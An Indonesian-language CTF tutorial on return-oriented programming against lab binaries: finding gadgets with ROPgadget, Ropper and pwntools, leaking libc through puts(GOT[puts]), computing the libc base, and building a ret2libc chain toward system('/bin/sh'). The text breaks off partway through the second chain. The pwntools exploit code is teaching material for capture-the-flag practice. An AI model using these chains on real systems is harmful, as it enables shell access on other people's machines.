---
id: "50"
title: "🔗 50 — ROP Chain Workflow"
category: "6. Binary & Reversing"
categoryId: "binary"
filename: "50_rop_chain_workflow.md"
refs_out: ["48","49","51","52","64"]
refs_in: ["48","49","52"]
---

# 🔗 50 — ROP Chain Workflow

> **Kategori:** Binary Exploitation  
> **Difficulty:** Beginner → Intermediate  
> **Fokus:** Return-Oriented Programming (ROP), ASLR leak, ret2libc, libc identification, one_gadget, ret2csu  
> **Prerequisite:** File 48 — Binary Analysis, File 49 — Buffer Overflow  
> **Tools:** `pwntools`, `ROPgadget`, `Ropper`, `GDB`, `pwndbg`, `readelf`, `objdump`, `ldd`  
> **Target:** CTF — Hack The Box, TryHackMe, PicoCTF, Root-Me, binary exploitation labs
> 
> **Core idea:**
> 
> `Buffer Overflow` memberi kita kemampuan mengontrol `RIP/EIP`.
> 
> `ROP` memberi kita kemampuan **menggunakan potongan-potongan code yang sudah ada** untuk melakukan sesuatu yang lebih kompleks daripada sekadar lompat ke satu fungsi.

---

# 🧠 BAGIAN 0 — FONDASI ROP

## 🎯 0.1 Mengapa ROP Diperlukan?

Pada File 49 kita belajar:

```text
Buffer Overflow
      │
      ▼
Control RIP/EIP
      │
      ├── ret2win
      │
      ├── ret2libc sederhana
      │
      └── shellcode
```

Masalahnya, dunia nyata CTF sering tidak sesederhana itu.

Bayangkan binary:

```text
NX      = ON
ASLR    = ON
PIE     = OFF
Canary  = OFF
win()   = TIDAK ADA
system  = TIDAK LANGSUNG TERSEDIA
```

Kita masih dapat mengontrol `RIP`, tetapi:

```text
NX ON
 │
 └── shellcode di stack tidak executable
```

dan:

```text
ASLR ON
 │
 └── address libc berubah setiap eksekusi
```

Ditambah:

```text
Tidak ada win()
      │
      ▼
Tidak ada fungsi "langsung jadi shell"
```

Maka kita membutuhkan **ROP**.

---

## 🕹️ Analogi ROP: Remote Control yang Rusak

Bayangkan ada remote control yang rusak.

Kita tidak bisa membuat tombol baru.

Tetapi tombol yang sudah ada masih berfungsi:

```text
[Volume Up]
[Volume Down]
[Channel Up]
[Channel Down]
[Power]
```

Kita dapat menekan tombol-tombol tersebut dalam urutan tertentu untuk menghasilkan efek tertentu.

ROP bekerja dengan konsep serupa.

Binary sudah memiliki potongan-potongan instruksi:

```text
pop rdi ; ret
pop rsi ; ret
pop rdx ; ret
ret
```

Kita tidak membuat instruksi tersebut.

Kita hanya:

```text
ambil gadget
   ↓
jalankan gadget
   ↓
ret
   ↓
ambil gadget berikutnya
   ↓
jalankan
   ↓
ret
```

---

## 🔗 Dari BOF ke ROP

```text
┌───────────────────────┐
│    Buffer Overflow    │
└───────────┬───────────┘
            │
            ▼
   Control Saved RIP
            │
            ▼
┌───────────────────────┐
│  Pilih gadget address │
└───────────┬───────────┘
            │
            ▼
┌───────────────────────┐
│     pop rdi ; ret     │
└───────────┬───────────┘
            │
            ▼
     RDI = argument
            │
            ▼
┌───────────────────────┐
│      puts@plt()       │
└───────────┬───────────┘
            │
            ▼
       Leak libc
            │
            ▼
     Calculate base
            │
            ▼
┌───────────────────────┐
│      Second ROP       │
│  system("/bin/sh")    │
└───────────┬───────────┘
            │
            ▼
          SHELL
```

---

## 🧩 Kondisi yang Sering Memaksa Penggunaan ROP

|Kondisi|Dampak|Strategi|
|---|---|---|
|NX OFF|Stack bisa executable|Shellcode bisa memungkinkan|
|NX ON|Stack tidak executable|ROP / ret2libc|
|ASLR OFF|Address stabil|Hardcode address bisa bekerja di lab tertentu|
|ASLR ON|Address berubah|Leak address|
|PIE OFF|Base binary stabil|Gadget binary lebih mudah dipakai|
|PIE ON|Base binary random|Perlu binary leak|
|`win()` ada|Exploit sederhana|ret2win|
|`win()` tidak ada|Perlu chain|ROP|
|`system()` tersedia + address diketahui|Bisa ret2libc|`pop rdi → /bin/sh → system`|
|Gadget terbatas|ROP standar sulit|ret2csu / alternatif gadget|

---

## 🧠 0.2 Apa Itu ROP Gadget?

**ROP gadget** adalah potongan kecil instruksi yang sudah ada di executable memory dan dapat digunakan sebagai building block exploit.

Contoh:

```asm
pop rdi
ret
```

Artinya:

```text
ambil nilai dari stack
       ↓
masukkan ke RDI
       ↓
ret ke address berikutnya
```

---

## 🔧 Gadget Paling Penting

### `pop rdi ; ret`

```asm
pop rdi
ret
```

Dipakai untuk mengatur:

```text
RDI = argument pertama
```

Pada System V AMD64 Linux:

```text
RDI = arg1
RSI = arg2
RDX = arg3
RCX = arg4
R8  = arg5
R9  = arg6
```

Jadi:

```text
system("/bin/sh")
```

dapat dilakukan dengan:

```text
pop rdi ; ret
        │
        ▼
   /bin/sh address
        │
        ▼
      system
```

---

### `pop rsi ; ret`

```asm
pop rsi
ret
```

Mengatur:

```text
RSI = arg2
```

---

### `pop rdx ; ret`

```asm
pop rdx
ret
```

Mengatur:

```text
RDX = arg3
```

---

### `pop rax ; ret`

```asm
pop rax
ret
```

Mengatur:

```text
RAX = syscall number
```

Berguna untuk syscall-based ROP.

---

### `syscall ; ret`

```asm
syscall
ret
```

Menjalankan syscall menggunakan register yang sudah diisi.

Contoh konsep:

```text
RAX = syscall number
RDI = arg1
RSI = arg2
RDX = arg3
      │
      ▼
   syscall
```

---

### `ret`

```asm
ret
```

Kelihatannya sangat sederhana.

Tetapi `ret` sangat penting untuk:

```text
stack alignment
```

dan memindahkan execution flow ke address berikutnya.

---

## 🔄 Kenapa Gadget Diakhiri `ret`?

Karena `ret` melakukan konsep:

```text
RIP = [RSP]
RSP = RSP + 8
```

Secara konseptual:

```text
STACK

+-------------------+
| next gadget       | ← RSP
+-------------------+
| next data         |
+-------------------+
```

Ketika:

```asm
ret
```

dieksekusi:

```text
RIP ← [RSP]
RSP ← RSP + 8
```

Sehingga chain berjalan:

```text
Gadget A
   │
   └── ret
        │
        ▼
Gadget B
   │
   └── ret
        │
        ▼
Gadget C
```

Inilah alasan ROP dapat dirangkai.

---

## 🧠 Mengapa Kita "Borrow" Code?

Dengan NX:

```text
Stack
 │
 └── NON-EXECUTABLE
```

Jadi:

```text
inject shellcode
      ↓
jump ke shellcode
      ↓
❌ gagal
```

ROP menggunakan code yang **sudah executable**:

```text
binary
 │
 ├── gadget
 ├── gadget
 ├── function
 └── libc
```

Kita tidak perlu menulis executable code baru.

Kita cukup mengontrol:

```text
RIP
 ↓
gadget
 ↓
gadget
 ↓
function
```

---

# 🧠 0.3 Recap Memory Layout yang Relevan

Untuk memahami ROP, kita perlu tiga komponen:

```text
Binary
 ├── PLT
 ├── GOT
 ├── .text
 └── functions

libc
 ├── system()
 ├── puts()
 ├── "/bin/sh"
 └── gadgets
```

---

## 📦 Apa Itu GOT?

**GOT — Global Offset Table**

GOT digunakan binary untuk menyimpan address runtime dari fungsi/library yang digunakan secara dinamis.

Contoh:

```text
puts()
system()
printf()
read()
```

Secara konseptual:

```text
Binary

puts@plt
   │
   ▼
GOT[puts]
   │
   ▼
runtime address of puts()
   │
   ▼
libc
```

---

## 🚪 Apa Itu PLT?

**PLT — Procedure Linkage Table**

PLT menyediakan entry point dalam binary untuk memanggil fungsi dinamis.

Secara sederhana:

```text
puts@plt
   │
   ▼
GOT[puts]
   │
   ▼
libc puts()
```

Jadi kita sering melihat pasangan:

```text
puts@plt
puts@got
```

---

## 🔄 Diagram PLT ↔ GOT

```text
                BINARY
                  │
          ┌───────┴───────┐
          │               │
       puts@plt       puts@got
          │               │
          │               │
          └──────►────────┘
                  │
                  ▼
             libc puts()
                  │
                  ▼
          runtime address
```

---

## 💡 Mengapa GOT Berguna untuk Leak?

Misalkan:

```text
GOT[puts] = 0x7ffff7e5c980
```

Address tersebut bukan sekadar address biasa.

Itu adalah address runtime fungsi:

```text
puts() di libc
```

Jadi:

```text
GOT[puts]
    │
    ▼
runtime puts()
    │
    ▼
puts address diketahui
    │
    ▼
libc base dapat dihitung
```

---

# 🎲 0.4 ASLR Recap

## Apa yang Di-randomize?

ASLR dapat mengacak base address berbagai memory region.

Secara umum:

```text
STACK
HEAP
LIBC
shared libraries
PIE executable
```

dapat memiliki base yang berubah.

---

## Apa yang Tidak Berubah?

Yang penting untuk dipahami:

```text
OFFSET DALAM OBJECT
```

tetap sama selama object/library yang digunakan sama.

Contoh:

```text
libc base:
0x7ffff7c00000

puts:
0x7ffff7c77980
```

Offset:

```text
0x77980
```

Jika eksekusi kedua:

```text
libc base:
0x7ffff79e0000

puts:
0x7ffff7a5a980
```

Offset tetap:

```text
0x77980
```

Jadi:

```text
runtime address = base + offset
```

dan:

```text
base = runtime address - offset
```

---

## 🧠 Prinsip Utama ASLR

```text
Leak 1 address
      │
      ▼
Hitung base
      │
      ▼
Gunakan offset object
      │
      ├── system
      ├── puts
      ├── execve
      ├── /bin/sh
      └── gadget
```

Ini merupakan salah satu konsep paling penting dalam modern binary exploitation.

---

# 🛠️ BAGIAN 1 — TOOLS UNTUK ROP

# 🧰 1.0 Setup & Verifikasi Tools Sebelum Mulai

Sebelum melakukan ROP exploitation, pastikan toolchain berikut telah terpasang dan dapat diverifikasi pada environment Anda (misalnya Parrot OS / Kali Linux):

```bash
# === SETUP TOOLS SEBELUM MULAI ===

# 1. Cek apakah pwndbg sudah terpasang
gdb --version
# Buka GDB dan cek prompt:
# Jika ada "pwndbg>" berarti sudah terpasang
# Jika hanya "(gdb)" berarti belum

# 2. Install pwndbg di Parrot OS (jika belum terpasang)
git clone https://github.com/pwndbg/pwndbg.git ~/tools/pwndbg
cd ~/tools/pwndbg
./setup.sh

# 3. Verifikasi pwndbg
gdb -q
# Seharusnya tampil prompt: pwndbg>

# 4. Install pwntools jika belum ada
pip3 install pwntools
python3 -c "from pwn import *; print('pwntools OK')"

# 5. Install ROPgadget
pip3 install ROPgadget
ROPgadget --version

# 6. Install one_gadget (butuh Ruby)
sudo apt update && sudo apt install ruby -y
gem install one_gadget
one_gadget --version

# 7. Install Ropper
pip3 install ropper
ropper --version
```

---

# 🔎 1.1 ROPgadget

`ROPgadget` digunakan untuk menemukan gadget.

## 📦 Install

```bash
# Install ROPgadget menggunakan pip
pip3 install ROPgadget
```

Contoh output:

```text
Collecting ROPgadget
Successfully installed ROPgadget-X.Y
```

> Versi dapat berbeda tergantung environment.

---

## 🔍 Cari Semua Gadget

```bash
# Menampilkan gadget yang ditemukan dari binary
ROPgadget --binary ./binary
```

Contoh output realistis:

```text
Gadgets information
============================================================
0x000000000040101a : ret
0x00000000004011ab : pop rdi ; ret
0x00000000004011a9 : pop rbp ; ret
0x00000000004011a7 : nop ; pop rbp ; ret
0x00000000004011b3 : leave ; ret

Unique gadgets found: 23
```

---

## 🎯 Cari `pop rdi`

```bash
# Mencari gadget untuk mengatur argument pertama
ROPgadget --binary ./binary | grep "pop rdi"
```

Contoh:

```text
0x00000000004011ab : pop rdi ; ret
```

---

## 🎯 Cari `pop rsi`

```bash
# Mencari gadget untuk mengatur argument kedua
ROPgadget --binary ./binary | grep "pop rsi"
```

---

## 🎯 Cari `ret`

```bash
# Mencari gadget ret sederhana yang sering digunakan untuk alignment
ROPgadget --binary ./binary | grep ": ret$"
```

Contoh:

```text
0x000000000040101a : ret
0x0000000000401032 : ret
```

---

## 🎯 Cari `pop rax`

```bash
# Mencari gadget untuk mengatur RAX
ROPgadget --binary ./binary | grep "pop rax"
```

---

## 📚 Cari Gadget dalam libc

```bash
# Mencari pop rdi dalam libc
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi"
```

Contoh:

```text
0x00000000000277e5 : pop rdi ; ret
```

**Penting:** address tersebut adalah **offset dalam libc file**, bukan otomatis runtime address.

---

## 💾 Simpan Gadget

```bash
# Menyimpan seluruh hasil gadget ke file untuk dianalisis nanti
ROPgadget --binary ./binary > gadgets.txt
```

---

# 🔎 1.2 Ropper

`Ropper` adalah alternatif untuk gadget discovery.

## 📦 Install

```bash
# Menginstall Ropper
pip3 install ropper
```

---

## 🔍 Basic Usage

```bash
# Menganalisis semua gadget pada binary
ropper -f ./binary
```

---

## 🎯 Search Gadget

```bash
# Mencari gadget pop rdi ; ret
ropper -f ./binary --search "pop rdi; ret"
```

Contoh:

```text
[INFO] Searching for gadgets: pop rdi; ret

0x00000000004011ab:
pop rdi;
ret;
```

---

## ⚙️ Generate Chain

```bash
# Mencoba menghasilkan ROP chain untuk target execve
ropper -f ./binary --chain execve
```

> Jangan menganggap chain otomatis selalu cocok untuk exploit. Tetap verifikasi register, stack layout, calling convention, dan constraint secara manual.

---

# 🐍 1.3 Pwntools ROP Module

Pwntools dapat mencari gadget langsung.

```python
#!/usr/bin/env python3

# Import seluruh modul pwntools
from pwn import *

# Load binary
elf = ELF("./binary", checksec=False)

# Membuat object ROP
rop = ROP(elf)

# Mencari gadget pop rdi ; ret
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

# Mencari gadget pop rsi ; ret
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]

# Mencari gadget ret
ret = rop.find_gadget(["ret"])[0]

# Menampilkan address gadget
print(hex(pop_rdi))
print(hex(pop_rsi))
print(hex(ret))
```

Contoh:

```text
0x4011ab
0x4011a9
0x40101a
```

---

# 💥 BAGIAN 2 — TEKNIK LEAK ASLR

> **INI ADALAH BAGIAN TERPENTING FILE 50.**

Jika pemula mengalami kesulitan dengan ROP, biasanya masalah bukan pada gadget.

Masalahnya sering berada pada:

```text
"Bagaimana saya mendapatkan address libc?"
```

Jawabannya:

```text
LEAK
```

---

# 🧠 2.1 Konsep Leak Address

Skenario umum:

```text
BUFFER OVERFLOW
      │
      ▼
CONTROL RIP
      │
      ▼
POP RDI ; RET
      │
      ▼
RDI = GOT[puts]
      │
      ▼
PUTS(GOT[puts])
      │
      ▼
OUTPUT RUNTIME PUTS ADDRESS
      │
      ▼
CALCULATE LIBC BASE
      │
      ▼
SYSTEM("/bin/sh")
```

Secara ringkas:

```text
overflow
   │
   ▼
call puts(GOT[puts])
   │
   ▼
output libc address
   │
   ▼
calculate libc base
   │
   ▼
find system
   │
   ▼
find /bin/sh
   │
   ▼
call system("/bin/sh")
```

---

# 🧩 2.2 Mengapa `puts(GOT[puts])` Bekerja?

Ini bagian yang harus benar-benar dipahami.

Misalkan binary memiliki:

```c
puts("Hello");
```

Binary biasanya memiliki:

```text
puts@plt
puts@got
```

dan libc menyediakan:

```text
puts()
```

Ketika program berjalan:

```text
puts@got
      │
      ▼
runtime puts address
```

Contoh:

```text
GOT[puts] = 0x7ffff7e5c980
```

Address tersebut kemudian kita berikan sebagai argument kepada:

```text
puts()
```

Karena pada AMD64:

```text
RDI = arg1
```

maka ROP:

```text
pop rdi
      │
      ▼
RDI = GOT[puts]
      │
      ▼
puts@plt
```

Secara konseptual:

```c
puts((char *)elf.got["puts"]);
```

`puts()` kemudian membaca bytes dari memory yang dimulai pada address tersebut dan mengeluarkan data sampai menemukan `NUL` byte atau sesuai perilaku fungsi dan data yang diberikan.

Untuk teknik leak fungsi, pada praktik CTF kita sering memanfaatkan fakta bahwa GOT entry berisi pointer ke fungsi dan output yang dihasilkan dapat digunakan untuk memperoleh byte-byte address. Namun cara parsing harus disesuaikan dengan terminator/output target; **jangan menganggap setiap leak selalu tepat satu newline-separated 6-byte value**.

---

# 🧠 Mental Model Leak

Jangan menghafal:

```text
puts(GOT[puts])
```

sebagai magic spell.

Pahami:

```text
GOT[puts]
    │
    ▼
"saya memiliki pointer ke puts runtime"
    │
    ▼
buat pointer tersebut keluar ke stdout
    │
    ▼
address bocor
    │
    ▼
hitung base libc
```

---

# 📌 2.3 Step-by-Step Leak dengan Pwntools

---

## 🧱 Step 1 — Load Binary

```python
#!/usr/bin/env python3

# Import pwntools
from pwn import *

# Load binary exploit target
elf = ELF("./binary", checksec=False)

# Menampilkan informasi keamanan binary
elf.checksec()
```

Contoh:

```text
[*] './binary'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

---

# 🔍 Step 2 — Cari GOT[puts]

```python
# Menampilkan address GOT untuk puts
print(hex(elf.got["puts"]))

# Menampilkan address PLT untuk puts
print(hex(elf.plt["puts"]))
```

Contoh:

```text
0x404018
0x401030
```

Artinya:

```text
puts@got = 0x404018
puts@plt = 0x401030
```

---

# 🧠 GOT vs PLT

Pemula sering tertukar:

```text
GOT ≠ PLT
```

Gunakan mental model:

```text
PLT = tempat kita CALL fungsi
GOT = tempat pointer runtime fungsi berada
```

Jadi chain leak umumnya:

```text
pop rdi
    │
    ▼
GOT[puts]
    │
    ▼
puts@plt
```

atau:

```text
RDI = elf.got["puts"]
CALL elf.plt["puts"]
```

---

# 🔎 Step 3 — Cari `pop rdi ; ret`

Dengan ROPgadget:

```bash
# Mencari gadget untuk memasukkan argument ke RDI
ROPgadget --binary ./binary | grep "pop rdi"
```

Contoh:

```text
0x00000000004011ab : pop rdi ; ret
```

Atau dengan Pwntools:

```python
# Membuat object ROP
rop = ROP(elf)

# Mencari gadget pop rdi ; ret
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]

# Menampilkan address gadget
print(hex(POP_RDI))
```

---

# 🧱 Step 4 — Cari `main()`

Kenapa?

Karena setelah leak selesai, kita sering ingin:

```text
LEAK
  ↓
kembali ke main()
  ↓
input overflow lagi
  ↓
EXPLOIT
```

Contoh:

```python
# Mengambil address main
MAIN_ADDR = elf.sym["main"]

# Menampilkan address main
print(hex(MAIN_ADDR))
```

Output:

```text
0x401176
```

---

# 🔁 Mengapa Return ke `main()`?

Ini adalah konsep yang sangat penting.

Misalkan program:

```c
int main() {
    vuln();
}
```

ROP stage pertama:

```text
vuln()
 │
 ▼
LEAK
 │
 ▼
return main
```

Program masuk kembali ke:

```text
main()
```

kemudian akhirnya memanggil:

```text
vuln()
```

lagi.

Sehingga kita mendapatkan:

```text
STAGE 1
   │
   ▼
LEAK
   │
   ▼
MAIN
   │
   ▼
VULN AGAIN
   │
   ▼
STAGE 2
```

---

## 🔄 Visualisasi Two-Stage Exploit

```text
             PROGRAM
                │
                ▼
              main()
                │
                ▼
              vuln()
                │
                ▼
         BUFFER OVERFLOW
                │
                ▼
        ┌───────────────┐
        │   ROP STAGE 1 │
        │     LEAK      │
        └───────┬───────┘
                │
                ▼
         puts(GOT[puts])
                │
                ▼
          LIBC ADDRESS
                │
                ▼
             main()
                │
                ▼
              vuln()
                │
                ▼
        ┌───────────────┐
        │   ROP STAGE 2 │
        │ ret2libc      │
        └───────┬───────┘
                │
                ▼
         system("/bin/sh")
                │
                ▼
              SHELL
```

---

---

# 🐞 2.3.1 Cara Debug Exploit Script dengan GDB (`gdb.debug`, `gdb.attach`, `pause`)

Saat mengembangkan ROP exploit script, pemula sering bingung melihat apa yang terjadi di dalam stack/register saat script berjalan.

```python
# === CARA DEBUG EXPLOIT SCRIPT DENGAN GDB ===

from pwn import *
elf = ELF("./binary", checksec=False)
context.binary = elf

# Method 1: gdb.debug() — GDB otomatis terbuka di terminal baru
# Sangat praktis untuk mentrace ROP chain dari awal
p = gdb.debug(elf.path, gdbscript="""
    set disassembly-flavor intel
    break main
    break *vuln+50
    continue
""")


# Method 2: gdb.attach() — attach ke process yang sedang berjalan
p = process(elf.path)
gdb.attach(p, gdbscript="""
    set disassembly-flavor intel
    break *vuln+50
    continue
""")


# Method 3: pause() / input() untuk attach GDB manual
p = process(elf.path)

# Tampilkan PID process agar mudah diattach
log.info(f"Process PID: {p.pid}")

# Script pause di sini. Buka terminal baru lalu jalankan: gdb -p [PID]
pause()  # atau: input("Press Enter after attaching GDB in another terminal...")

# Kirim payload setelah GDB ter-attach
p.sendline(payload)
p.interactive()
```

---

# 📩 2.3.2 `sendline()` vs `send()` — Memilih Cara Pengiriman Payload yang Tepat

Banyak kegagalan ROP terjadi hanya karena perbedaan pengalokasian byte input (`\n`).

### 💡 Penjelasan Masalah:
- `p.sendline(payload)` otomatis menambahkan byte newline (`\n` / `0x0a`) di akhir data.
- `p.send(payload)` mengirimkan raw bytes persis tanpa tambahan byte `\n`.

```python
# === SENDLINE vs SEND — KAPAN PAKAI MANA ===

# 1. Binary menggunakan gets() / fgets() / scanf() → Gunakan sendline()
# Karena fungsi-fungsi ini menunggu newline sebagai penanda selesai input.
p.sendline(payload)

# 2. Binary menggunakan read(0, buf, size) → Gunakan send()
# PENTING: read() membaca semua byte termasuk \n sebagai data mentah!
# Jika pakai sendline(), byte \n (0x0a) akan ikut tertulis ke stack dan
# bisa merusak p64() gadget address di saved RIP.
p.send(payload)

# === CARA IDENTIFIKASI DI GDB / GHIDRA ===
# Disassemble fungsi input (e.g. main/vuln)
# - Jika menemukan call ke <gets@plt> atau <fgets@plt>  → sendline()
# - Jika menemukan call ke <read@plt>                  → send()

# === CARA CEK JIKA NEWLINE MERUSAK STACK ===
# Di GDB pwndbg setelah crash:
# pwndbg> x/20gx $rsp
# Perhatikan apakah ada byte 0x0a yang terselip di akhir address gadget Anda!
```

---

# 🧱 Step 5 — Build First Leak Chain

```python
# Membuat ROP chain pertama untuk melakukan leak puts
chain1 = flat(
    b"A" * OFFSET,

    # Gadget untuk memasukkan argument ke RDI
    p64(POP_RDI),

    # Argument pertama = address GOT puts
    p64(elf.got["puts"]),

    # Memanggil puts melalui PLT
    p64(elf.plt["puts"]),

    # Kembali ke main untuk stage kedua
    p64(MAIN_ADDR)
)
```

Struktur stack:

```text
OFFSET
   │
   ▼
AAAAAAAAAAAAAAAA...
   │
   ▼
POP_RDI
   │
   ▼
GOT[puts]
   │
   ▼
puts@plt
   │
   ▼
main
```

---

# 🧠 Breakdown Satu-Satu

### Bagian 1

```python
# Mengisi sampai saved RIP
b"A" * OFFSET
```

---

### Bagian 2

```python
# RIP diarahkan ke gadget pop rdi ; ret
p64(POP_RDI)
```

Execution:

```text
RIP = POP_RDI
```

---

### Bagian 3

```python
# Nilai setelah POP RDI masuk ke RDI
p64(elf.got["puts"])
```

Karena:

```asm
pop rdi
```

maka:

```text
RDI = elf.got["puts"]
```

---

### Bagian 4

```python
# Setelah ret, panggil puts
p64(elf.plt["puts"])
```

Secara konsep:

```c
puts(elf.got["puts"]);
```

---

### Bagian 5

```python
# Setelah puts selesai, kembali ke main
p64(MAIN_ADDR)
```

Sehingga:

```text
STAGE 1
  ↓
LEAK
  ↓
MAIN
  ↓
VULN
```

---

# 📡 Step 6 — Receive Leak

Ini bagian yang sering menyebabkan bug.

Pemula sering menulis:

```python
leaked = p.recv()
```

lalu:

```python
u64(leaked)
```

kemudian bingung.

Masalahnya:

```text
recv()
```

dapat menerima:

```text
prompt
newline
partial output
leak
next prompt
```

dalam satu chunk.

Kita perlu memahami fungsi parsing.

---

# 📚 `recv()` vs `recvline()` vs `recvuntil()`

|Method|Perilaku|Kapan digunakan|
|---|---|---|
|`recv()`|Menerima bytes sebanyak yang tersedia/hingga kondisi tertentu|Saat framing tidak diketahui|
|`recvline()`|Membaca sampai newline|Leak yang benar-benar line-based|
|`recvuntil(x)`|Membaca sampai delimiter tertentu|Prompt/output dengan marker|
|`recvn(n)`|Membaca tepat `n` bytes|Leak fixed-length|
|`clean()`|Membersihkan buffered data|Debugging / sinkronisasi tertentu|

---

## 📌 `recv()`

```python
# Membaca bytes yang tersedia dari socket/process
data = p.recv()
```

Misalnya result:

```text
b'Welcome!\n\x80\xa9\xe5\xf7\xff\x7f\n'
```

Masalah:

```text
mana bagian leak?
```

---

## 📌 `recvline()`

```python
# Membaca satu baris sampai newline
line = p.recvline()
```

Contoh:

```text
b'\x80\xa9\xe5\xf7\xff\x7f\n'
```

Ini cocok apabila target memang mencetak leak sebagai line.

Tetapi jangan mengasumsikan newline selalu menjadi framing leak.

---

## 📌 `recvuntil()`

```python
# Membaca sampai delimiter tertentu ditemukan
data = p.recvuntil(b"Input:")
```

Contoh:

```text
Welcome!
Leaked data...
Input:
```

`recvuntil()` membantu menyamakan posisi parser dengan state program.

---

## 📌 `recvn()`

```python
# Membaca tepat 8 byte
data = p.recvn(8)
```

Berguna jika program secara eksplisit mengirim:

```text
8-byte pointer
```

Tetapi banyak leak dari `puts()` bukan fixed-length 8-byte protocol, sehingga jangan menggunakan `recvn(8)` secara membabi buta.

---

# 🧠 Parsing Leak dengan Aman

Pada x86-64, pointer secara umum direpresentasikan sebagai 8 byte.

Namun output leak tidak selalu berisi 8 byte penuh.

Contoh:

```text
\x80\xa9\xe5\xf7\xff\x7f
```

Hanya:

```text
6 bytes
```

Maka:

```python
# Menambahkan null byte sampai total menjadi 8 byte
leaked = leaked.ljust(8, b"\x00")

# Mengubah little-endian bytes menjadi integer 64-bit
puts_addr = u64(leaked)
```

---

# 🧩 Mengapa `ljust(8, b"\x00")`?

Misalkan:

```python
leaked = b"\x80\xa9\xe5\xf7\xff\x7f"
```

Panjang:

```text
6 bytes
```

Tetapi:

```python
u64()
```

mengharapkan:

```text
8 bytes
```

Maka:

```python
leaked.ljust(8, b"\x00")
```

menghasilkan:

```text
80 a9 e5 f7 ff 7f 00 00
```

Kemudian:

```python
u64(...)
```

mengubahnya menjadi:

```text
0x7ffff7e5a980
```

---

# 📐 Little Endian

Memory bytes:

```text
80 a9 e5 f7 ff 7f
```

dibaca sebagai:

```text
0x7ffff7e5a980
```

Karena x86-64 menggunakan little-endian representation.

Mental model:

```text
memory:

80
a9
e5
f7
ff
7f
00
00

        │
        ▼

0x7ffff7e5a980
```

---

# 🧪 Contoh Parsing Leak

```python
# Mengirim chain leak tahap pertama
p.sendline(chain1)

# Membaca data sampai newline
leaked = p.recvline().strip()

# Menambahkan null byte sampai 8 byte
leaked = leaked.ljust(8, b"\x00")

# Mengubah bytes little-endian menjadi integer
puts_addr = u64(leaked)

# Menampilkan hasil
log.info(f"puts leak = {hex(puts_addr)}")
```

Contoh output:

```text
[*] puts leak = 0x7ffff7e5a980
```

---

# ⚠️ Parsing Leak Tidak Universal

Jangan menganggap:

```python
leaked = p.recvline()
```

selalu benar.

Ada target yang menghasilkan:

```text
Enter name:
[LEAK]
Enter name:
```

Ada juga:

```text
AAAA
[LEAK]
```

atau:

```text
LEAK + additional bytes
```

Maka kita perlu:

```text
lihat output asli
      ↓
tentukan framing
      ↓
pilih recvline / recvuntil / recvn / recv
```

---

# 🐛 DEBUG: Lihat RAW BYTES

Saat leak mencurigakan:

```python
# Mencetak representasi bytes mentah
log.info(f"RAW = {leaked!r}")
```

Contoh:

```text
[*] RAW = b'\x80\xa9\xe5\xf7\xff\x7f'
```

atau:

```text
[*] RAW = b'Welcome\n\x80\xa9\xe5\xf7\xff\x7f\n'
```

Kasus kedua menunjukkan parser kita salah.

---

# 🔍 Step 7 — Hitung Libc Base

Setelah kita mendapatkan:

```text
puts_addr
```

kita butuh offset `puts` dalam libc.

```python
# Mendefinisikan libc file lokal
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

# Mengambil offset puts dari libc
puts_offset = libc.sym["puts"]

# Menghitung base address libc
libc_base = puts_addr - puts_offset

# Menampilkan hasil
log.info(f"puts offset = {hex(puts_offset)}")
log.info(f"libc base = {hex(libc_base)}")
```

Contoh:

```text
[*] puts offset = 0x77980
[*] libc base = 0x7ffff7dc0000
```

---

# 🚨 WARNING — JANGAN HARDCODE LIBC OFFSET

**Jangan lakukan ini:**

```python
SYSTEM = puts_addr + 0x4c490
```

atau:

```python
BINSH = libc_base + 0x196031
```

sebagai metode default.

Gunakan:

```python
libc.sym["puts"]
libc.sym["system"]
libc.search(...)
```

Contoh:

```python
# Menghitung base menggunakan symbol offset
libc_base = puts_addr - libc.sym["puts"]

# Memberitahu pwntools base libc yang ditemukan
libc.address = libc_base

# Mengambil runtime address system
SYSTEM = libc.sym["system"]

# Mencari string /bin/sh setelah base diset
BINSH = next(libc.search(b"/bin/sh\x00"))
```

Ini jauh lebih portable selama:

```text
libc file benar
```

dan:

```text
runtime libc = libc yang kita load
```

---

# 🧠 Kenapa `libc.address = libc_base` Sangat Berguna?

Tanpa base:

```text
libc.sym["system"]
```

memberikan offset relatif.

Setelah:

```python
libc.address = libc_base
```

Pwntools akan memperlakukan symbol tersebut sebagai runtime address.

Contoh:

```python
# Memberitahu pwntools base address libc
libc.address = libc_base

# Mendapatkan runtime address system
SYSTEM = libc.sym["system"]

# Mendapatkan runtime address string /bin/sh
BINSH = next(libc.search(b"/bin/sh\x00"))
```

---

# ✅ Step 8 — Verify Libc Base

Libc mapping biasanya page-aligned.

Artinya lower 12 bits biasanya:

```text
000
```

Verifikasi:

```python
# Memastikan libc base page-aligned
assert libc_base & 0xfff == 0, \
    f"Invalid libc base: {hex(libc_base)}"
```

Contoh valid:

```text
0x7ffff7dc0000
```

Contoh mencurigakan:

```text
0x7ffff7dc0123
```

---

# 🧮 Mengapa `& 0xfff`?

Karena:

```text
0xfff = 12 bit terakhir
```

Jika:

```text
base & 0xfff == 0
```

berarti:

```text
lower 12 bits = 0
```

atau:

```text
page aligned
```

Ini **sanity check**, bukan bukti tunggal bahwa leak pasti benar.

---

# 🔍 Step 9 — Hitung `system()` dan `/bin/sh`

```python
# Mengambil runtime address system dari libc
SYSTEM = libc.sym["system"]

# Mencari string /bin/sh yang terdapat di libc
BINSH = next(libc.search(b"/bin/sh\x00"))

# Menampilkan address
log.info(f"system = {hex(SYSTEM)}")
log.info(f"/bin/sh = {hex(BINSH)}")
```

Contoh:

```text
[*] system = 0x7ffff7e4c490
[*] /bin/sh = 0x7ffff7f95bd8
```

---

# 🧱 Step 10 — Build Second ROP Chain

Sekarang kita sudah mengetahui:

```text
POP_RDI
RET
BINSH
SYSTEM
```

Chain:

```python
# Membuat ROP chain tahap kedua untuk system("/bin/sh")
chain2 = flat(
    b"A" * OFFSET,

    # Optional alignment ret bila diperlukan target
    p64(RET),

    # Mengatur argumen pertama
    p64(POP_RDI),

    # RDI = address string /bin/sh
    p64(BINSH),

